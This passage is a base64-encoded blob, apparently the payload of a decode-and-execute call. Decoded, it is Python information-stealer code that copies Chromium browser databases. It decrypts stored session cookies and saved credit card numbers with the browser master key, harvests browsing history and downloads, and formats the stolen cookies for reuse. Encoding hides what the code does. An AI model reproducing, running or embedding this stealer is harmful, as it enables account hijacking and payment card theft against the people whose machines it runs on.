aWVzX2RiKToNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHNodXRpbC5jb3B5KGNvb2tpZXNfZGIsICdjb29raWVzX2RiJykNCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgnY29va2llc19kYicpDQogICAgICAgIGNvbm4udGV4dF9mYWN0b3J5ID0gYnl0ZXMNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBwYXRoLCBlbmNyeXB0ZWRfdmFsdWUsZXhwaXJlc191dGMgRlJPTSBjb29raWVzJykNCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgICAgIGlmIG5vdCByb3dbMF0gb3Igbm90IHJvd1sxXSBvciBub3Qgcm93WzJdIG9yIG5vdCByb3dbM106DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGNvb2tpZSA9IHNlbGYuZGVjcnlwdF9wYXNzd29yZChyb3dbM10sIHNlbGYubWFzdGVyX2tleSkNCg0KICAgICAgICAgICAgcm93ID0gW3guZGVjb2RlKCdsYXRpbi0xJykgaWYgaXNpbnN0YW5jZSh4LCBieXRlcykgZWxzZSB4IGZvciB4IGluIHJvd10NCiAgICAgICAgICAgIF9fQ09PS0lFU19fLmFwcGVuZChUeXBlcy5Db29raWUocm93WzBdLCByb3dbMV0sIHJvd1syXSwgY29va2llLCByb3dbNF0pKQ0KDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICBvcy5yZW1vdmUoJ2Nvb2tpZXNfZGInKQ0KDQogICAgZGVmIGdldF93ZWJfaGlzdG9yeShzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6DQogICAgICAgIGhpc3RvcnlfZGIgPSBmJ3twYXRofVxcSGlzdG9yeScNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGhpc3RvcnlfZGIpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgc2h1dGlsLmNvcHkoaGlzdG9yeV9kYiwgJ2hpc3RvcnlfZGInKQ0KICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCdoaXN0b3J5X2RiJykNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHVybCwgdGl0bGUsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMiKQ0KICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgaWYgbm90IHJvd1swXSBvciBub3Qgcm93WzFdIG9yIG5vdCByb3dbMl06DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIF9fV0VCX0hJU1RPUllfXy5hcHBlbmQoVHlwZXMuV2ViSGlzdG9yeShyb3dbMF0sIHJvd1sxXSwgcm93WzJdKSkNCg0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KICAgICAgICBjb25uLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKCdoaXN0b3J5X2RiJykNCg0KICAgIGRlZiBnZXRfZG93bmxvYWRzKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZToNCiAgICAgICAgZG93bmxvYWRzX2RiID0gZid7cGF0aH1cXEhpc3RvcnknDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkb3dubG9hZHNfZGIpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgc2h1dGlsLmNvcHkoZG93bmxvYWRzX2RiLCAnZG93bmxvYWRzX2RiJykNCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgnZG93bmxvYWRzX2RiJykNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRhYl91cmwsIHRhcmdldF9wYXRoIEZST00gZG93bmxvYWRzJykNCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgICAgIGlmIG5vdCByb3dbMF0gb3Igbm90IHJvd1sxXToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICBfX0RPV05MT0FEU19fLmFwcGVuZChUeXBlcy5Eb3dubG9hZChyb3dbMF0sIHJvd1sxXSkpDQoNCiAgICAgICAgY3Vyc29yLmNsb3NlKCkNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSgnZG93bmxvYWRzX2RiJykNCg0KICAgIGRlZiBnZXRfY3JlZGl0X2NhcmRzKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZToNCiAgICAgICAgY2FyZHNfZGIgPSBmJ3twYXRofVxcV2ViIERhdGEnDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjYXJkc19kYik6DQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzaHV0aWwuY29weShjYXJkc19kYiwgJ2NhcmRzX2RiJykNCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgnY2FyZHNfZGInKQ0KICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgICAgIGN1cnNvci5leGVjdXRlKCdTRUxFQ1QgbmFtZV9vbl9jYXJkLCBleHBpcmF0aW9uX21vbnRoLCBleHBpcmF0aW9uX3llYXIsIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCwgZGF0ZV9tb2RpZmllZCBGUk9NIGNyZWRpdF9jYXJkcycpDQogICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6DQogICAgICAgICAgICBpZiBub3Qgcm93WzBdIG9yIG5vdCByb3dbMV0gb3Igbm90IHJvd1syXSBvciBub3Qgcm93WzNdIG9yIG5vdCByb3dbNF06DQogICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgY2FyZF9udW1iZXIgPSBzZWxmLmRlY3J5cHRfcGFzc3dvcmQocm93WzNdLCBzZWxmLm1hc3Rlcl9rZXkpDQogICAgICAgICAgICBfX0NBUkRTX18uYXBwZW5kKFR5cGVzLkNyZWRpdENhcmQocm93WzBdLCByb3dbMV0sIHJvd1syXSwgY2FyZF9udW1iZXIsIHJvd1s0XSkpDQoNCiAgICAgICAgY3Vyc29yLmNsb3NlKCkNCiAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgIG9zLnJlbW92ZSgnY2FyZHNfZGInKQ0KDQpjbGFzcyBUeXBlczoNCiAgICBjbGFzcyBMb2dpbjoNCiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYsIHVybCwgdXNlcm5hbWUsIHBhc3N3b3JkKToNCiAgICAgICAgICAgIHNlbGYudXJsID0gdXJsDQogICAgICAgICAgICBzZWxmLnVzZXJuYW1lID0gdXNlcm5hbWUNCiAgICAgICAgICAgIHNlbGYucGFzc3dvcmQgPSBwYXNzd29yZA0KDQogICAgICAgIGRlZiBfX3N0cl9fKHNlbGYpOg0KICAgICAgICAgICAgcmV0dXJuIGYne3NlbGYudXJsfVx0e3NlbGYudXNlcm5hbWV9XHR7c2VsZi5wYXNzd29yZH0nDQoNCiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOg0KICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19zdHJfXygpDQoNCiAgICBjbGFzcyBDb29raWU6DQogICAgICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBuYW1lLCBwYXRoLCB2YWx1ZSwgZXhwaXJlcyk6DQogICAgICAgICAgICBzZWxmLmhvc3QgPSBob3N0DQogICAgICAgICAgICBzZWxmLm5hbWUgPSBuYW1lDQogICAgICAgICAgICBzZWxmLnBhdGggPSBwYXRoDQogICAgICAgICAgICBzZWxmLnZhbHVlID0gdmFsdWUNCiAgICAgICAgICAgIHNlbGYuZXhwaXJlcyA9IGV4cGlyZXMNCg0KICAgICAgICBkZWYgX19zdHJfXyhzZWxmKToNCiAgICAgICAgICAgIHJldHVybiBmJ3tzZWxmLmhvc3R9XHR7IkZBTFNFIiBpZiBzZWxmLmV4cGlyZXMgPT0gMCBlbHNlICJUUlVFIn1cdHtzZWxmLnBhdGh9XHR7IkZBTFNFIiBpZiBzZWxmLmhvc3Quc3RhcnRzd2l0aCgiLiIpIGVsc2UgIlRSVUUifVx0e3NlbGYuZXhwaXJlc31cdHtzZWxmLm5hbWV9XHR7c2VsZi52YWx1ZX0nDQoNCiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOg0KICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19zdHJfXygpDQoNCiAgICBjbGFzcyBXZWJIaXN0b3J5Og0KICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgdXJsLCB0aXRsZSwgdGltZXN0YW1wKToNCiAgICAgICAgICAgIHNlbGYudXJsID0gdXJsDQogICAgICAgICAgICBzZWxmLnRpdGxlID0gdGl0bGUNCiAgICAgICAgICAgIHNlbGYudGltZXN0YW1wID0gdGltZXN0YW1wDQoNCiAgICAgICAgZGVmIF9fc3RyX18oc2VsZik6DQogICAgICAgICAgICByZXR1cm4gZid7c2VsZi51cmx9XHR7c2VsZi50aXRsZX1cdHtzZWxmLnRpbWVzdGFtcH0nDQoNCiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOg0KICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19zdHJfXygpDQoNCiAgICBjbGFzcyBEb3dubG9hZDoNCiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYsIHRhYl91cmwsIHRhcmdldF9wYXRoKToNCiAgICAgICAgICAgIHNlbGYudGFiX3VybCA9IHRhYl91cmwNCiAgICAgICAgICAgIHNlbGYudGFyZ2V0X3BhdGggPSB0YXJnZXRfcGF0aA0KDQogICAgICAgIGRlZiBfX3N0cl9fKHNlbGYpOg0KICAgICAgICAgICAgcmV0dXJuIGYne3NlbGYudGFiX3VybH1cdHtzZWxmLnRhcmdldF9wYXRofScNCg0KICAgICAgICBkZWYgX19yZXByX18oc2VsZik6DQogICAgICAgICAgICByZXR1cm4gc2VsZi5fX3N0cl9fKCkNCg0KICAgIGNsYXNzIENyZWRpdENhcmQ6DQogICAgICAgIGRlZiBfX2luaXRfXyhzZWxmLCBuYW1lLCBtb250aCwgeWVhciwgbnVtYmVyLCBkYXRlX21vZGlmaWVkKToNCiAgICAgICAgICAgIHNlbGYubmFtZSA9IG5hbWUNCiAgICAgICAgICAgIHNlbGYubW9udGggPSBtb250aA0KICAgICAgICAgICAgc2VsZi55ZWFyID0geWVhcg0KICAgICAgICAgICAgc2VsZi5udW1iZXIgPSBudW1iZXINCiAgICAgICAgICAgIHNlbGYuZGF0ZV9tb2RpZmllZCA9IGRhdGVfbW9kaWZpZWQNCg0KICAgICAgICBkZWYgX19zdHJfXyhzZWxmKToNCiAgICAgICAgICAgIHJldHVybiBmJ3tzZWxmLm5hbWV9XHR7c2VsZi5tb250aH1cdHtzZWxmLnllYXJ9XHR7c2VsZi5udW1iZXJ9XHR7c2VsZi5kYXRlX21vZGlmaWVkfScNCg0KICAgICAgICBkZWYgX19yZXByX18oc2VsZik6DQogICAgICAgICAgICByZXR1cm4gc2VsZi5fX3N0cl9fKCkNCg=="))
